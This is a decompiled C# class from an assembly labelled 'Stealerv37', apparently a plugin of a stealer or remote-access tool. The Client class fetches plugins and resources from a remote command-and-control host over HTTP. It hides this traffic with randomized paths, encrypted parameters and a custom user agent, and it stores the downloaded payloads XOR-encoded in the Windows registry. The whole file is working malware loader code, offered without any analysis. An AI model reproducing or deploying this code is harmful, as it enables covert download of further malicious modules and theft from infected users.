// Decompiled with JetBrains decompiler
// Type: CvMega.Helper.Client
// Assembly: Stealerv37, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D491006B-B4AE-4407-B02D-3CC101716992
// Assembly location: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Client.dll

using System;
using System.Collections.Generic;
using System.Net.Http;
using System.Text;

#nullable disable
namespace CvMega.Helper;

internal class Client
{
  public static string currentHost = string.Empty;

  public static byte[] GetPlugin(string name)
  {
    if (name == nameof (Client))
      return (byte[]) null;
    if (RegeditKey.CheckValue("ao" + name))
      return SimpleEncryptor.XorEncryptMyKey(Convert.FromBase64String(RegeditKey.GetValue("ao" + name)), (byte) 66);
    byte[] data = Client.SendGet(new Dictionary<string, string>()
    {
      {
        "command",
        "plugin"
      },
      {
        nameof (name),
        name
      }
    });
    if (data == null)
      return (byte[]) null;
    RegeditKey.SetValue("ao" + name, Convert.ToBase64String(SimpleEncryptor.XorEncryptMyKey(data, (byte) 66)));
    return data;
  }

  public static byte[] GetResource(string name)
  {
    if (name == nameof (Client))
      return (byte[]) null;
    if (RegeditKey.CheckValue("oa" + name))
      return SimpleEncryptor.XorEncryptMyKey(Convert.FromBase64String(RegeditKey.GetValue("ao" + name)), (byte) 66);
    byte[] data = Client.SendGet(new Dictionary<string, string>()
    {
      {
        "command",
        "resource"
      },
      {
        nameof (name),
        name
      }
    });
    if (data == null)
      return (byte[]) null;
    RegeditKey.SetValue("ao" + name, Convert.ToBase64String(SimpleEncryptor.XorEncryptMyKey(data, (byte) 66)));
    return data;
  }

  public static string SendGetRequest(Dictionary<string, string> parameters)
  {
    byte[] bytes = Client.SendGet(parameters);
    return bytes == null ? (string) null : SimpleEncryptor.Decrypt(Encoding.UTF8.GetString(bytes));
  }

  public static byte[] SendGet(Dictionary<string, string> parameters)
  {
    try
    {
      using (HttpClient httpClient = new HttpClient())
      {
        StringBuilder stringBuilder = new StringBuilder(Client.currentHost + RandomPathGenerator.GenerateCompletelyRandomPath());
        if (parameters.Count > 0)
        {
          stringBuilder.Append("?");
          foreach (KeyValuePair<string, string> parameter in parameters)
            stringBuilder.Append($"{SimpleEncryptor.Hash(parameter.Key)}={SimpleEncryptor.Encrypt(parameter.Value)}&");
          --stringBuilder.Length;
        }
        string requestUri = stringBuilder.ToString();
        httpClient.DefaultRequestHeaders.Add("User-Agent", "cvmega");
        return httpClient.GetAsync(requestUri).Result.Content.ReadAsByteArrayAsync().Result;
      }
    }
    catch
    {
      return (byte[]) null;
    }
  }
}
